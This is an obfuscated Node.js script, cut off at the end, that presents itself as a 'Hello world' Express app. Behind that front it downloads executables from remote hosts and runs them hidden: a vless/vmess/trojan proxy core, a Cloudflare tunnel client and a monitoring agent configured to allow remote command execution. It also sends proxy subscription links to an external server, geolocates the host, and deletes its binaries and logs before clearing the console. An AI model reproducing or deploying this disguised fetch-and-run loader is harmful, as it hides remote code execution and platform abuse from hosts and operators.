const _0x203c67=_0x2a6b;(function(_0x387654,_0x5bfd9b){const _0x5c3f54=_0x2a6b,_0x5597bd=_0x387654();while(!![]){try{const _0x3fc118=-parseInt(_0x5c3f54(0x1d4))/0x1*(-parseInt(_0x5c3f54(0x1e6))/0x2)+-parseInt(_0x5c3f54(0x1d6))/0x3+parseInt(_0x5c3f54(0x241))/0x4*(parseInt(_0x5c3f54(0x225))/0x5)+parseInt(_0x5c3f54(0x19e))/0x6*(parseInt(_0x5c3f54(0x19b))/0x7)+parseInt(_0x5c3f54(0x218))/0x8+parseInt(_0x5c3f54(0x217))/0x9*(parseInt(_0x5c3f54(0x249))/0xa)+-parseInt(_0x5c3f54(0x23d))/0xb;if(_0x3fc118===_0x5bfd9b)break;else _0x5597bd['push'](_0x5597bd['shift']());}catch(_0x2864a9){_0x5597bd['push'](_0x5597bd['shift']());}}}(_0x31eb,0x8a32a));const express=require(_0x203c67(0x1f6)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x203c67(0x1e7)),exec=promisify(require(_0x203c67(0x1fd))[_0x203c67(0x207)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x203c67(0x1bc)][_0x203c67(0x1ea)]||'',PROJECT_URL=process['env'][_0x203c67(0x20f)]||'',AUTO_ACCESS=process['env'][_0x203c67(0x21d)]||![],FILE_PATH=process['env'][_0x203c67(0x1ba)]||_0x203c67(0x1cd),SUB_PATH=process[_0x203c67(0x1bc)][_0x203c67(0x240)]||_0x203c67(0x220),PORT=process['env'][_0x203c67(0x1c6)]||process[_0x203c67(0x1bc)][_0x203c67(0x1ac)]||0xbb8,UUID=process['env']['UUID']||_0x203c67(0x1b7),NEZHA_SERVER=process['env'][_0x203c67(0x1d1)]||'',NEZHA_PORT=process[_0x203c67(0x1bc)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x203c67(0x1bc)][_0x203c67(0x247)]||'',ARGO_DOMAIN=process[_0x203c67(0x1bc)][_0x203c67(0x1b9)]||'',ARGO_AUTH=process[_0x203c67(0x1bc)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x203c67(0x1bc)][_0x203c67(0x1e3)]||0x1f41,CFIP=process[_0x203c67(0x1bc)][_0x203c67(0x1f0)]||_0x203c67(0x195),CFPORT=process[_0x203c67(0x1bc)][_0x203c67(0x1b8)]||0x1bb,NAME=process[_0x203c67(0x1bc)][_0x203c67(0x246)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x203c67(0x24c)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x203c67(0x1ff)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x274f42=_0x203c67,_0x102525=_0x274f42(0x1be);let _0x14ce5b='';for(let _0x57e187=0x0;_0x57e187<0x6;_0x57e187++){_0x14ce5b+=_0x102525[_0x274f42(0x211)](Math[_0x274f42(0x1dc)](Math[_0x274f42(0x201)]()*_0x102525[_0x274f42(0x245)]));}return _0x14ce5b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x203c67(0x1cf)](FILE_PATH,npmName),phpPath=path[_0x203c67(0x1cf)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x203c67(0x1cf)](FILE_PATH,botName),subPath=path[_0x203c67(0x1cf)](FILE_PATH,_0x203c67(0x1d0)),listPath=path[_0x203c67(0x1cf)](FILE_PATH,_0x203c67(0x1d5)),bootLogPath=path[_0x203c67(0x1cf)](FILE_PATH,_0x203c67(0x198)),configPath=path[_0x203c67(0x1cf)](FILE_PATH,'config.json');function deleteNodes(){const _0x242e10=_0x203c67;try{if(!UPLOAD_URL)return;if(!fs[_0x242e10(0x1f5)](subPath))return;let _0x29ba81;try{_0x29ba81=fs[_0x242e10(0x1c0)](subPath,_0x242e10(0x1fe));}catch{return null;}const _0x3dc4e1=Buffer[_0x242e10(0x1fb)](_0x29ba81,_0x242e10(0x209))[_0x242e10(0x18f)](_0x242e10(0x1fe)),_0x5740fd=_0x3dc4e1[_0x242e10(0x1c1)]('\x0a')[_0x242e10(0x1c9)](_0x4f908a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x242e10(0x197)](_0x4f908a));if(_0x5740fd[_0x242e10(0x245)]===0x0)return;return axios[_0x242e10(0x1e1)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x242e10(0x1c3)]({'nodes':_0x5740fd}),{'headers':{'Content-Type':'application/json'}})[_0x242e10(0x1bf)](_0x1e19d9=>{return null;}),null;}catch(_0x424630){return null;}}function cleanupOldFiles(){const _0x5ced51=_0x203c67;try{const _0x39ff3b=fs[_0x5ced51(0x239)](FILE_PATH);_0x39ff3b[_0x5ced51(0x1ef)](_0x58841a=>{const _0x4228c3=_0x5ced51,_0x376a72=path[_0x4228c3(0x1cf)](FILE_PATH,_0x58841a);try{const _0x511c10=fs[_0x4228c3(0x1cc)](_0x376a72);_0x511c10['isFile']()&&fs['unlinkSync'](_0x376a72);}catch(_0x3b978e){}});}catch(_0xab26fb){}}app[_0x203c67(0x1c5)]('/',function(_0x40ed04,_0x5be197){const _0x3fa17e=_0x203c67;_0x5be197[_0x3fa17e(0x22e)](_0x3fa17e(0x21b));});async function generateConfig(){const _0x39b073=_0x203c67,_0x11cd21={'log':{'access':_0x39b073(0x1a0),'error':_0x39b073(0x1a0),'loglevel':_0x39b073(0x1d7)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x39b073(0x23b),'settings':{'clients':[{'id':UUID,'flow':_0x39b073(0x230)}],'decryption':_0x39b073(0x1d7),'fallbacks':[{'dest':0xbb9},{'path':_0x39b073(0x1f3),'dest':0xbba},{'path':_0x39b073(0x1d2),'dest':0xbbb},{'path':_0x39b073(0x234),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x39b073(0x204),'protocol':_0x39b073(0x23b),'settings':{'clients':[{'id':UUID}],'decryption':_0x39b073(0x1d7)},'streamSettings':{'network':'tcp','security':_0x39b073(0x1d7)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x39b073(0x23b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x39b073(0x1d7)},'streamSettings':{'network':'ws','security':_0x39b073(0x1d7),'wsSettings':{'path':_0x39b073(0x1f3)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x39b073(0x1a7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x39b073(0x204),'protocol':_0x39b073(0x1a6),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x39b073(0x1d2)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x39b073(0x196),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x39b073(0x22f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x39b073(0x234)}},'sniffing':{'enabled':!![],'destOverride':[_0x39b073(0x1a1),_0x39b073(0x196),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x39b073(0x22d)]},'outbounds':[{'protocol':'freedom','tag':_0x39b073(0x1b0)},{'protocol':_0x39b073(0x20a),'tag':_0x39b073(0x224)}]};fs[_0x39b073(0x1db)](path['join'](FILE_PATH,_0x39b073(0x206)),JSON['stringify'](_0x11cd21,null,0x2));}function getSystemArchitecture(){const _0x5aff54=_0x203c67,_0x3e5f96=os[_0x5aff54(0x21a)]();return _0x3e5f96===_0x5aff54(0x1fc)||_0x3e5f96===_0x5aff54(0x22c)||_0x3e5f96===_0x5aff54(0x1c2)?_0x5aff54(0x1fc):_0x5aff54(0x236);}function downloadFile(_0x4aae96,_0x3897f5,_0x46e7e7){const _0x496b55=_0x203c67,_0x516c6a=_0x4aae96;!fs['existsSync'](FILE_PATH)&&fs[_0x496b55(0x24c)](FILE_PATH,{'recursive':!![]});const _0x10d76b=fs[_0x496b55(0x1ae)](_0x516c6a);axios({'method':_0x496b55(0x1c5),'url':_0x3897f5,'responseType':_0x496b55(0x237)})[_0x496b55(0x1b6)](_0x22224b=>{const _0x5083c4=_0x496b55;_0x22224b[_0x5083c4(0x212)][_0x5083c4(0x1a9)](_0x10d76b),_0x10d76b['on']('finish',()=>{const _0x5c80f4=_0x5083c4;_0x10d76b[_0x5c80f4(0x1f9)](),console[_0x5c80f4(0x1ff)](_0x5c80f4(0x223)+path[_0x5c80f4(0x24d)](_0x516c6a)+_0x5c80f4(0x1c7)),_0x46e7e7(null,_0x516c6a);}),_0x10d76b['on']('error',_0x3a10c8=>{const _0x81a025=_0x5083c4;fs['unlink'](_0x516c6a,()=>{});const _0x3671a6=_0x81a025(0x223)+path[_0x81a025(0x24d)](_0x516c6a)+_0x81a025(0x228)+_0x3a10c8[_0x81a025(0x1ed)];console[_0x81a025(0x19d)](_0x3671a6),_0x46e7e7(_0x3671a6);});})[_0x496b55(0x1bf)](_0xc69801=>{const _0x1bad82=_0x496b55,_0x1279f8=_0x1bad82(0x223)+path[_0x1bad82(0x24d)](_0x516c6a)+_0x1bad82(0x228)+_0xc69801['message'];console[_0x1bad82(0x19d)](_0x1279f8),_0x46e7e7(_0x1279f8);});}async function downloadFilesAndRun(){const _0x5bb1a7=_0x203c67,_0x2835ec=getSystemArchitecture(),_0x510772=getFilesForArchitecture(_0x2835ec);if(_0x510772[_0x5bb1a7(0x245)]===0x0){console[_0x5bb1a7(0x1ff)](_0x5bb1a7(0x1a3));return;}const _0xf911=_0x510772[_0x5bb1a7(0x242)](_0xeb322c=>{return new Promise((_0x7e123d,_0x57399c)=>{const _0x2703d1=_0x2a6b;downloadFile(_0xeb322c[_0x2703d1(0x1a5)],_0xeb322c[_0x2703d1(0x208)],(_0x30c956,_0xa28f85)=>{_0x30c956?_0x57399c(_0x30c956):_0x7e123d(_0xa28f85);});});});try{await Promise[_0x5bb1a7(0x221)](_0xf911);}catch(_0x4434fa){console[_0x5bb1a7(0x19d)](_0x5bb1a7(0x1e5),_0x4434fa);return;}function _0xaa361b(_0x5d3cf8){const _0x267fc3=_0x5bb1a7,_0x1ad34e=0x1fd;_0x5d3cf8[_0x267fc3(0x1ef)](_0x286de3=>{const _0x6d4df3=_0x267fc3;fs[_0x6d4df3(0x1f5)](_0x286de3)&&fs[_0x6d4df3(0x1af)](_0x286de3,_0x1ad34e,_0x63b422=>{const _0x4799d1=_0x6d4df3;_0x63b422?console[_0x4799d1(0x19d)]('Empowerment\x20failed\x20for\x20'+_0x286de3+':\x20'+_0x63b422):console[_0x4799d1(0x1ff)](_0x4799d1(0x219)+_0x286de3+':\x20'+_0x1ad34e[_0x4799d1(0x18f)](0x8));});});}const _0x1c3098=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xaa361b(_0x1c3098);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2b8c34=NEZHA_SERVER[_0x5bb1a7(0x248)](':')?NEZHA_SERVER[_0x5bb1a7(0x1c1)](':')[_0x5bb1a7(0x227)]():'',_0x30e70a=new Set([_0x5bb1a7(0x233),_0x5bb1a7(0x1c4),_0x5bb1a7(0x1cb),_0x5bb1a7(0x1b3),_0x5bb1a7(0x24f),_0x5bb1a7(0x21e)]),_0x44b832=_0x30e70a[_0x5bb1a7(0x226)](_0x2b8c34)?'true':'false',_0x3499f6=_0x5bb1a7(0x1ec)+NEZHA_KEY+_0x5bb1a7(0x23c)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x44b832+_0x5bb1a7(0x1ee)+UUID;fs[_0x5bb1a7(0x1db)](path[_0x5bb1a7(0x1cf)](FILE_PATH,_0x5bb1a7(0x24e)),_0x3499f6);const _0x569743='nohup\x20'+phpPath+_0x5bb1a7(0x24a)+FILE_PATH+_0x5bb1a7(0x235);try{await exec(_0x569743),console[_0x5bb1a7(0x1ff)](phpName+'\x20is\x20running'),await new Promise(_0x25aa7a=>setTimeout(_0x25aa7a,0x3e8));}catch(_0x5d1f8d){console['error']('php\x20running\x20error:\x20'+_0x5d1f8d);}}else{let _0xd0a432='';const _0x3eb150=[_0x5bb1a7(0x233),_0x5bb1a7(0x1c4),_0x5bb1a7(0x1cb),_0x5bb1a7(0x1b3),_0x5bb1a7(0x24f),'2053'];_0x3eb150[_0x5bb1a7(0x248)](NEZHA_PORT)&&(_0xd0a432=_0x5bb1a7(0x238));const _0x18cfee=_0x5bb1a7(0x1e9)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5bb1a7(0x1a2)+NEZHA_KEY+'\x20'+_0xd0a432+_0x5bb1a7(0x22a);try{await exec(_0x18cfee),console[_0x5bb1a7(0x1ff)](npmName+'\x20is\x20running'),await new Promise(_0x1960b3=>setTimeout(_0x1960b3,0x3e8));}catch(_0x42b358){console[_0x5bb1a7(0x19d)]('npm\x20running\x20error:\x20'+_0x42b358);}}}else console[_0x5bb1a7(0x1ff)](_0x5bb1a7(0x20e));const _0x2377db=_0x5bb1a7(0x1e9)+webPath+_0x5bb1a7(0x215)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2377db),console['log'](webName+'\x20is\x20running'),await new Promise(_0x45728f=>setTimeout(_0x45728f,0x3e8));}catch(_0xcb6ee9){console['error'](_0x5bb1a7(0x232)+_0xcb6ee9);}if(fs[_0x5bb1a7(0x1f5)](botPath)){let _0x4895bd;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4895bd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5bb1a7(0x1e2)](/TunnelSecret/)?_0x4895bd='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5bb1a7(0x1a4):_0x4895bd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5bb1a7(0x21f)+ARGO_PORT;try{await exec(_0x5bb1a7(0x1e9)+botPath+'\x20'+_0x4895bd+_0x5bb1a7(0x216)),console[_0x5bb1a7(0x1ff)](botName+_0x5bb1a7(0x1de)),await new Promise(_0xc078df=>setTimeout(_0xc078df,0x7d0));}catch(_0x19bee8){console[_0x5bb1a7(0x19d)]('Error\x20executing\x20command:\x20'+_0x19bee8);}}await new Promise(_0x592765=>setTimeout(_0x592765,0x1388));}function getFilesForArchitecture(_0x5656b0){const _0x5e5c3c=_0x203c67;let _0x6c8109;_0x5656b0===_0x5e5c3c(0x1fc)?_0x6c8109=[{'fileName':webPath,'fileUrl':_0x5e5c3c(0x214)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x6c8109=[{'fileName':webPath,'fileUrl':_0x5e5c3c(0x1aa)},{'fileName':botPath,'fileUrl':_0x5e5c3c(0x1fa)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1fb772=_0x5656b0==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x5e5c3c(0x193);_0x6c8109[_0x5e5c3c(0x192)]({'fileName':npmPath,'fileUrl':_0x1fb772});}else{const _0x17b1dc=_0x5656b0==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x5e5c3c(0x1d8);_0x6c8109[_0x5e5c3c(0x192)]({'fileName':phpPath,'fileUrl':_0x17b1dc});}}return _0x6c8109;}function argoType(){const _0x1f079d=_0x203c67;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1f079d(0x1ff)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1f079d(0x248)]('TunnelSecret')){fs['writeFileSync'](path[_0x1f079d(0x1cf)](FILE_PATH,_0x1f079d(0x191)),ARGO_AUTH);const _0x17ebe6=_0x1f079d(0x1f8)+ARGO_AUTH[_0x1f079d(0x1c1)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1f079d(0x1cf)](FILE_PATH,_0x1f079d(0x191))+_0x1f079d(0x1b1)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1f079d(0x1db)](path[_0x1f079d(0x1cf)](FILE_PATH,_0x1f079d(0x1dd)),_0x17ebe6);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}function _0x31eb(){const _0x1a8e1b=['success','ArgoDomain:','SUB_PATH','97124RuJrdJ','map','\x0avless://','status','length','NAME','NEZHA_KEY','includes','3126900pTJygj','\x20-c\x20\x22','application/json','mkdirSync','basename','config.yaml','2083','toString','org','tunnel.json','unshift','https://amd64.ssss.nyc.mn/agent','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','cdns.doon.eu.org','tls','test','boot.log','Nodes\x20uploaded\x20successfully','/api/add-nodes','238QmlZRs','http\x20server\x20is\x20running\x20on\x20port:','error','154482NEjuqi','App\x20is\x20running','/dev/null','http','\x20-p\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/tunnel.yml\x20run','fileName','vmess','quic','\x22\x20>\x20/dev/null\x202>&1','pipe','https://amd64.ssss.nyc.mn/web','?security=tls&sni=','PORT','listen','createWriteStream','chmod','direct','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','automatic\x20access\x20task\x20added\x20successfully','2087','ARGO_DOMAIN:','substring','then','44ec58fb-960f-4249-b363-2a54fb3a9a4d','CFPORT','ARGO_DOMAIN','FILE_PATH','Unknown','env','Skipping\x20adding\x20automatic\x20access\x20task','abcdefghijklmnopqrstuvwxyz','catch','readFileSync','split','aarch64','stringify','8443','get','SERVER_PORT','\x20successfully','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','filter','Unhandled\x20error\x20in\x20startserver:','2096','statSync','./tmp','\x0a\x0atrojan://','join','sub.txt','NEZHA_SERVER','/vmess-argo','/vmess-argo?ed=2560','4669NTOPpe','list.txt','2638806UlXVQR','none','https://amd64.ssss.nyc.mn/v1','countryCode','https://oooo.serv00.net/add-url','writeFileSync','floor','tunnel.yml','\x20is\x20running','https://ipapi.co/json/','set','post','match','ARGO_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Error\x20downloading\x20files:','250NkXNzn','util','Error\x20in\x20startserver:','nohup\x20','UPLOAD_URL','taskkill\x20/f\x20/im\x20','\x0aclient_secret:\x20','message','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','forEach','CFIP','win32','&fp=firefox&type=ws&host=','/vless-argo','text/plain;\x20charset=utf-8','existsSync','express','pkill\x20-f\x20\x22[','\x0a\x20\x20tunnel:\x20','close','https://amd64.ssss.nyc.mn/bot','from','arm','child_process','utf-8','log','&path=%2Fvless-argo%3Fed%3D2560#','random','.exe\x20>\x20nul\x202>&1','platform','127.0.0.1','\x0a\x0avmess://','config.json','exec','fileUrl','base64','blackhole','country_code','push','?encryption=none&security=tls&sni=','NEZHA\x20variable\x20is\x20empty,skip\x20running','PROJECT_URL','\x0a\x20\x20\x20\x20','charAt','data','unlinkSync','https://arm64.ssss.nyc.mn/web','\x20-c\x20','\x20>/dev/null\x202>&1\x20&','9CAUdwP','3535224WdJStO','Empowerment\x20success\x20for\x20','arch','Hello\x20world!','clear','AUTO_ACCESS','2053','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','sub','all','rm\x20-rf\x20','Download\x20','block','55wdZgBG','has','pop','\x20failed:\x20','response','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Error\x20reading\x20boot.log:','arm64','https+local://8.8.8.8/dns-query','send','trojan','xtls-rprx-vision','firefox','web\x20running\x20error:\x20','443','/trojan-argo','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','amd','stream','--tls','readdirSync','\x20>/dev/null\x202>&1','vless','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','11385517fIzMcq'];_0x31eb=function(){return _0x1a8e1b;};return _0x31eb();}async function extractDomains(){const _0x33cf1d=_0x203c67;let _0x4be43a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4be43a=ARGO_DOMAIN,console[_0x33cf1d(0x1ff)](_0x33cf1d(0x1b4),_0x4be43a),await _0x23b4a8(_0x4be43a);else try{const _0x328666=fs['readFileSync'](path['join'](FILE_PATH,_0x33cf1d(0x198)),'utf-8'),_0x1f17bd=_0x328666[_0x33cf1d(0x1c1)]('\x0a'),_0x32df4e=[];_0x1f17bd['forEach'](_0x2cc0b3=>{const _0x72e19b=_0x33cf1d,_0x1b2525=_0x2cc0b3['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1b2525){const _0x2be9c7=_0x1b2525[0x1];_0x32df4e[_0x72e19b(0x20c)](_0x2be9c7);}});if(_0x32df4e[_0x33cf1d(0x245)]>0x0)_0x4be43a=_0x32df4e[0x0],console[_0x33cf1d(0x1ff)](_0x33cf1d(0x23f),_0x4be43a),await _0x23b4a8(_0x4be43a);else{console['log'](_0x33cf1d(0x1c8)),fs[_0x33cf1d(0x213)](path[_0x33cf1d(0x1cf)](FILE_PATH,_0x33cf1d(0x198)));async function _0x16fe11(){const _0x3aaaed=_0x33cf1d;try{process[_0x3aaaed(0x203)]===_0x3aaaed(0x1f1)?await exec(_0x3aaaed(0x1eb)+botName+_0x3aaaed(0x202)):await exec(_0x3aaaed(0x1f7)+botName[_0x3aaaed(0x211)](0x0)+']'+botName[_0x3aaaed(0x1b5)](0x1)+_0x3aaaed(0x1a8));}catch(_0x22434a){}}_0x16fe11(),await new Promise(_0x39a4de=>setTimeout(_0x39a4de,0xbb8));const _0x2b339a=_0x33cf1d(0x1e4)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x33cf1d(0x1e9)+botPath+'\x20'+_0x2b339a+_0x33cf1d(0x216)),console['log'](botName+_0x33cf1d(0x1de)),await new Promise(_0x185427=>setTimeout(_0x185427,0xbb8)),await extractDomains();}catch(_0x269079){console[_0x33cf1d(0x19d)]('Error\x20executing\x20command:\x20'+_0x269079);}}}catch(_0x581bb8){console[_0x33cf1d(0x19d)](_0x33cf1d(0x22b),_0x581bb8);}async function _0x7847f3(){const _0x27e07c=_0x33cf1d;try{const _0x346d19=await axios['get'](_0x27e07c(0x1df),{'timeout':0xbb8});if(_0x346d19[_0x27e07c(0x212)]&&_0x346d19[_0x27e07c(0x212)][_0x27e07c(0x20b)]&&_0x346d19[_0x27e07c(0x212)][_0x27e07c(0x190)])return _0x346d19[_0x27e07c(0x212)]['country_code']+'_'+_0x346d19[_0x27e07c(0x212)][_0x27e07c(0x190)];}catch(_0x3c02f0){try{const _0x13bcb4=await axios[_0x27e07c(0x1c5)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x13bcb4[_0x27e07c(0x212)]&&_0x13bcb4[_0x27e07c(0x212)][_0x27e07c(0x244)]===_0x27e07c(0x23e)&&_0x13bcb4[_0x27e07c(0x212)][_0x27e07c(0x1d9)]&&_0x13bcb4['data'][_0x27e07c(0x190)])return _0x13bcb4[_0x27e07c(0x212)][_0x27e07c(0x1d9)]+'_'+_0x13bcb4[_0x27e07c(0x212)][_0x27e07c(0x190)];}catch(_0x14760d){}}return _0x27e07c(0x1bb);}async function _0x23b4a8(_0x42aa83){const _0x34bb64=await _0x7847f3(),_0x1e1af5=NAME?NAME+'-'+_0x34bb64:_0x34bb64;return new Promise(_0x316ffa=>{setTimeout(()=>{const _0x413a6d=_0x2a6b,_0x100294={'v':'2','ps':''+_0x1e1af5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x413a6d(0x1d7),'net':'ws','type':_0x413a6d(0x1d7),'host':_0x42aa83,'path':_0x413a6d(0x1d3),'tls':_0x413a6d(0x196),'sni':_0x42aa83,'alpn':'','fp':_0x413a6d(0x231)},_0x41745c=_0x413a6d(0x243)+UUID+'@'+CFIP+':'+CFPORT+_0x413a6d(0x20d)+_0x42aa83+'&fp=firefox&type=ws&host='+_0x42aa83+_0x413a6d(0x200)+_0x1e1af5+_0x413a6d(0x205)+Buffer[_0x413a6d(0x1fb)](JSON[_0x413a6d(0x1c3)](_0x100294))[_0x413a6d(0x18f)](_0x413a6d(0x209))+_0x413a6d(0x1ce)+UUID+'@'+CFIP+':'+CFPORT+_0x413a6d(0x1ab)+_0x42aa83+_0x413a6d(0x1f2)+_0x42aa83+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1e1af5+_0x413a6d(0x210);console[_0x413a6d(0x1ff)](Buffer['from'](_0x41745c)[_0x413a6d(0x18f)](_0x413a6d(0x209))),fs[_0x413a6d(0x1db)](subPath,Buffer['from'](_0x41745c)[_0x413a6d(0x18f)](_0x413a6d(0x209))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x568455,_0x79860a)=>{const _0x35d784=_0x413a6d,_0x364eb2=Buffer[_0x35d784(0x1fb)](_0x41745c)['toString']('base64');_0x79860a[_0x35d784(0x1e0)]('Content-Type',_0x35d784(0x1f4)),_0x79860a[_0x35d784(0x22e)](_0x364eb2);}),_0x316ffa(_0x41745c);},0x7d0);});}}async function uploadNodes(){const _0x16c47d=_0x203c67;if(UPLOAD_URL&&PROJECT_URL){const _0x5079dd=PROJECT_URL+'/'+SUB_PATH,_0x8bc58e={'subscription':[_0x5079dd]};try{const _0x58fede=await axios[_0x16c47d(0x1e1)](UPLOAD_URL+'/api/add-subscriptions',_0x8bc58e,{'headers':{'Content-Type':_0x16c47d(0x24b)}});return _0x58fede&&_0x58fede[_0x16c47d(0x244)]===0xc8?(console[_0x16c47d(0x1ff)]('Subscription\x20uploaded\x20successfully'),_0x58fede):null;}catch(_0x43a413){if(_0x43a413['response']){if(_0x43a413[_0x16c47d(0x229)][_0x16c47d(0x244)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4815e3=fs[_0x16c47d(0x1c0)](listPath,_0x16c47d(0x1fe)),_0x17df74=_0x4815e3[_0x16c47d(0x1c1)]('\x0a')[_0x16c47d(0x1c9)](_0x3972e0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x16c47d(0x197)](_0x3972e0));if(_0x17df74[_0x16c47d(0x245)]===0x0)return;const _0x2c82eb=JSON[_0x16c47d(0x1c3)]({'nodes':_0x17df74});try{const _0x27b28e=await axios[_0x16c47d(0x1e1)](UPLOAD_URL+_0x16c47d(0x19a),_0x2c82eb,{'headers':{'Content-Type':'application/json'}});return _0x27b28e&&_0x27b28e[_0x16c47d(0x244)]===0xc8?(console[_0x16c47d(0x1ff)](_0x16c47d(0x199)),_0x27b28e):null;}catch(_0x30f480){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x509f7d=_0x2a6b,_0x3584ea=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3584ea[_0x509f7d(0x20c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3584ea[_0x509f7d(0x20c)](phpPath);process[_0x509f7d(0x203)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x3584ea[_0x509f7d(0x1cf)]('\x20')+'\x20>\x20nul\x202>&1',_0x4c67fd=>{const _0x4fa3ef=_0x509f7d;console['clear'](),console['log'](_0x4fa3ef(0x19f)),console[_0x4fa3ef(0x1ff)](_0x4fa3ef(0x194));}):exec(_0x509f7d(0x222)+_0x3584ea[_0x509f7d(0x1cf)]('\x20')+_0x509f7d(0x23a),_0x368304=>{const _0x1914ff=_0x509f7d;console[_0x1914ff(0x21c)](),console[_0x1914ff(0x1ff)](_0x1914ff(0x19f)),console[_0x1914ff(0x1ff)](_0x1914ff(0x194));});},0x15f90);}cleanFiles();function _0x2a6b(_0x153210,_0x261d80){const _0x31ebcb=_0x31eb();return _0x2a6b=function(_0x2a6bf2,_0x5424f5){_0x2a6bf2=_0x2a6bf2-0x18f;let _0x211022=_0x31ebcb[_0x2a6bf2];return _0x211022;},_0x2a6b(_0x153210,_0x261d80);}async function AddVisitTask(){const _0x3e8a4e=_0x203c67;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3e8a4e(0x1ff)](_0x3e8a4e(0x1bd));return;}try{const _0xf80322=await axios[_0x3e8a4e(0x1e1)](_0x3e8a4e(0x1da),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3e8a4e(0x24b)}});return console[_0x3e8a4e(0x1ff)](_0x3e8a4e(0x1b2)),_0xf80322;}catch(_0x1263b1){return console[_0x3e8a4e(0x19d)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x1263b1['message']),null;}}async function startserver(){const 